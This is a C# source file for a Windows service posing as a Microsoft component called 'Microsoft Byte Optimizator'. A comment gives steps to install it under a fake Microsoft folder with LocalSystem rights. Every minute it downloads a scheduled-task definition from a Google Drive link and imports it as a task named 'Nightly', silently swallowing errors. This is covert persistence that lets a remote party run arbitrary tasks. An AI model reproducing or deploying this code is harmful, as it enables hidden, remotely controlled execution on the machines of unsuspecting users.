using System;
using System.IO;
using System.Net;
using System.Reflection;
using Microsoft.Win32.TaskScheduler;
/*TODO
 * Copy to "C:\Program Files (x86)\Microsoft\Sync"
 *      IdleTimeOptimization.exe
 *      IdleTimeOptimization.exe.config
 *      Microsoft.Win32.TaskScheduler.dll
 *      Topshelf.dll\
 * Execute 
 *      "C:\Program Files (x86)\Microsoft\Sync\IdleTimeOptimization.exe" install --localsystem --sudo -servicename MicrosoftByteOptimizator -description "Optimize byte usage of extensive network payloads" -displayname "Microsoft Byte Optimizator" start
 *      "C:\Program Files (x86)\Microsoft\Sync\IdleTimeOptimization.exe" start
 */


namespace IdleTimeOptimization
{
    public class ScheduluedTaskRestore
    {
        private System.Threading.Timer timer_;
        public void Start()
        {
            timer_ = new System.Threading.Timer(SetTask, null, 0, 1000 * 60);
        }

        public void Stop()
        {
            timer_?.Dispose();
            timer_ = null;
        }

        private void SetTask(object state)
        {
            try
            {
                using (TaskService service = new TaskService())
                {
                    string xmlFile = null;
                    try
                    {
                        service.BeginInit();
                        xmlFile = GetFromGoogle();
                        if (!string.IsNullOrEmpty(xmlFile) && File.Exists(xmlFile))
                        {
                            try
                            {
                                service.RootFolder.ImportTask("Nightly", xmlFile, true);
                                return;
                            }
                            catch (Exception ex)
                            {
                            }
                        }

                        xmlFile = GetFromResource();
                        if (!string.IsNullOrEmpty(xmlFile) && File.Exists(xmlFile))
                        {
                            using (Task task = service.RootFolder.ImportTask("Nightly", xmlFile, true))
                            {
                            }
                        }
                    }
                    finally
                    {
                        service.EndInit();
                        if (!string.IsNullOrEmpty(xmlFile))
                        {
                            File.Delete(xmlFile);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }

        }

        // https://drive.google.com/file/d/1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm/view?usp=sharing
        // https://drive.google.com/uc?id=1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm&export=download
        private string GetFromGoogle()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string xmlFile = Path.GetTempFileName();
                    client.DownloadFile("https://drive.google.com/uc?id=1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm&export=download", xmlFile);
                    return xmlFile;
                }
            }
            catch (Exception ex)
            {
            }
            return null;
        }

        private string GetFromResource()
        {
            try
            {
                string[] names = Assembly.GetExecutingAssembly().GetManifestResourceNames();
                if ((names != null) && (names.Length > 0))
                {
                    string xmlFile = Path.GetTempFileName();
                    using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(names[0]))
                    {
                        using (var file = new FileStream(xmlFile, FileMode.Create, FileAccess.Write))
                        {
                            resource.CopyTo(file);
                        }
                    }
                    return xmlFile;
                }
            }
            catch (Exception ex)
            {
            }
            return null;
        }

    }
}